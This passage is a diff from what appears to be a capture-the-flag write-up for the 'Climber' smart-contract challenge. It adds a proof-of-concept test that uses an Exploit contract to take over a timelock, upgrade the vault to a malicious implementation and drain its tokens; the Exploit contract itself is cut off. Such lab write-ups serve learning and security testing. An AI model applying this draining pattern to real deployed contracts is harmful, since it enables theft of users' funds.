@@ -65,6 +65,18 @@ function updateDelay(uint64 newDelay) external {
 ### Impact/Proof of Concept
 
 ```diff
+function test_climber() public checkSolvedByPlayer {
+        console.log("Vault beforeBalance: ", token.balanceOf(address(vault)));
+        Exploit exploit = new Exploit(payable(timelock),address(vault));
+        exploit.timelockExecute();
+        // After obtaining ownership, we implement our malicious upgraded implementation contract and withdraw tokens
+        PwnedClimberVault newVaultImpl = new PwnedClimberVault();
+        vault.upgradeToAndCall(address(newVaultImpl),"");
+        PwnedClimberVault(address(vault)).withdrawAll(address(token),recovery); 
+        console.log("Vault afterBalance: ", token.balanceOf(address(vault)));
+        console.log("Recovery afterBalance: ", token.balanceOf(recovery));
+    }
+
 contract Exploit {
     address payable private immutable timelock;
 
